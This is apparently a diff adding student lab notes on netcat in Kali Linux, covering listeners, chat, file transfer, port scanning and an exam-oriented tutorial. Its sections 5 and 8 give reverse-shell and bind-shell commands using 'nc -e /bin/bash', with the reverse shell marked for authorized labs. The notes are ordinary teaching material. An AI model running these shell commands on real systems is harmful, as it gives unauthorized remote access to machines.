@@ -1,0 +1,299 @@
+netcat
+Aim: Client server programming using NETCAT tool in KALI.
+NETCAT tool in KALI
+Netcat is one of the most powerful networking tools, security tools, and network monitoring
+tools. It acts like a cat command over a network. It is even considered a Swiss army knife of
+networking tools. It is generally used for the following reasons:
+
+● Operation related to TCP, UDP, or UNIX-domain sockets.
+● Port Scanning
+● Port Listening
+● Port redirection
+● open Remote connections
+● Read/Write data across the network.
+● Network debugging
+● Network daemon testing
+● Simple TCP proxies
+● A Socks or HTTP Proxy Command for ssh
+
+Syntax of the `nc` command in KALI Linux
+The basic syntax for the nc command as follows.
+nc [options] [hostname] [port]
+[options]: Use to customize the behavior of the nc command. Some examples include adding
+verbose output, setting a timeout for connections, etc.
+
+[hostname]: The hostname or the IP address of the target we want to connect to or interact with
+using netcat. It can be both Domain name (e.g., example.com) or an IP address (e.g.,
+192.168.0.1).
+
+[port]: The port number of the target that we want to connect to or interact with. Ports are used
+to identify specific services or applications running on a system. (For example: port 80 (HTTP)
+or port 22 (SSH) connections.
+netcat (nc) command options
+
+It offers various options that help us in enhancing its functionality. Some commonly used
+options include:
+Options Description
+-l
+Listen mode, used to create a server that listens for incoming
+connections.
+-p
+Specifies the source port number.
+-v
+Verbose mode, provides more detailed output.
+-z
+Scans for open ports.
+-w
+Sets a timeout for connections.
+-q
+Specifies the delay before closing the connection.
+
+Two Primary Working Modes of Netcat.
+
+1. Client Server Programming using browser:
+ifconfig
+nc –l –p 5555 –v
+listening mode…
+
+Go to firefox and write following in URL:
+10.0.0.5:5555
+
+Screenshot:
+
+2. Client Server Programming on the local host (Chatting):
+On Terminal 1
+Nc –l –p 5555
+On Terminal 2
+Nc 127.0.0.1 5555
+Connection will be established and chatting can be done between server and client on the local
+host.
+
+
+
+
+
+Running **Netcat (nc)** in **Kali Linux** is easier than Windows because Kali already has Netcat installed. Here’s how you can run it step-by-step.
+
+---
+
+# **How to Run Netcat in Kali Linux**
+
+## **Step 1: Check if Netcat is Installed**
+
+Open terminal and type:
+
+```bash
+nc -h
+```
+
+OR
+
+```bash
+ncat -h
+```
+
+If installed, it will show the **help menu**.
+
+Kali Linux usually includes **Netcat** by default.
+
+---
+
+# **Basic Netcat Commands in Kali**
+
+These are the most commonly used commands in labs and practical exams.
+
+---
+
+# **1. Start Listener (Server Mode)**
+
+```bash
+nc -l -p 4444
+```
+
+**Meaning:**
+
+* `-l` → Listen mode
+* `-p` → Port number
+* `4444` → Listening port
+
+Now Kali waits for connection.
+
+---
+
+# **2. Connect to Another System**
+
+From another machine:
+
+```bash
+nc 192.168.1.10 4444
+```
+
+Replace:
+
+* `192.168.1.10` → Target IP
+* `4444` → Port
+
+Now both systems can **send messages**.
+
+---
+
+# **3. Chat Between Kali and Another Machine**
+
+### On Kali (Listener):
+
+```bash
+nc -l -p 5555
+```
+
+### On Other System:
+
+```bash
+nc 192.168.1.10 5555
+```
+
+You can now type messages between systems.
+
+---
+
+# **4. Transfer File Using Netcat**
+
+## Receiver (Kali):
+
+```bash
+nc -l -p 1234 > received.txt
+```
+
+## Sender (Other System):
+
+```bash
+nc 192.168.1.10 1234 < file.txt
+```
+
+File will be transferred.
+
+---
+
+# **5. Reverse Shell (Lab Practice Only)**
+
+⚠️ Use only in **authorized lab environment**.
+
+## Listener (Kali):
+
+```bash
+nc -l -p 4444
+```
+
+## Target Machine:
+
+```bash
+nc 192.168.1.10 4444 -e /bin/bash
+```
+
+This opens remote shell.
+
+---
+
+# **6. Scan Ports Using Netcat**
+
+```bash
+nc -zv 192.168.1.10 20-80
+```
+
+**Meaning:**
+
+* `-z` → Scan mode
+* `-v` → Verbose
+* `20-80` → Port range
+
+Used to check open ports.
+
+---
+
+# **7. UDP Mode**
+
+```bash
+nc -u -l -p 4444
+```
+
+**Meaning:**
+
+* `-u` → UDP mode
+
+---
+
+# **8. Bind Shell Example**
+
+On target:
+
+```bash
+nc -l -p 4444 -e /bin/bash
+```
+
+On attacker:
+
+```bash
+nc 192.168.1.10 4444
+```
+
+---
+
+# **9. Find Your IP Address in Kali**
+
+Before connecting, get your IP:
+
+```bash
+ip a
+```
+
+OR
+
+```bash
+ifconfig
+```
+
+Look for:
+
+```text
+inet 192.168.x.x
+```
+
+Use that IP in Netcat commands.
+
+---
+
+# **If Netcat Is Not Installed (Rare in Kali)**
+
+Install using:
+
+```bash
+sudo apt update
+sudo apt install netcat
+```
+
+OR
+
+```bash
+sudo apt install netcat-traditional
+```
+
+---
+
+# **Simple Practical Example (Very Useful for Viva)**
+
+### Kali Terminal:
+
+```bash
+nc -l -p 4444
+```
+
+### Windows PowerShell:
+
+```powershell
+ncat 192.168.1.10 4444
+```
+
+Now type messages — they appear on both sides.
+
+---
+
+
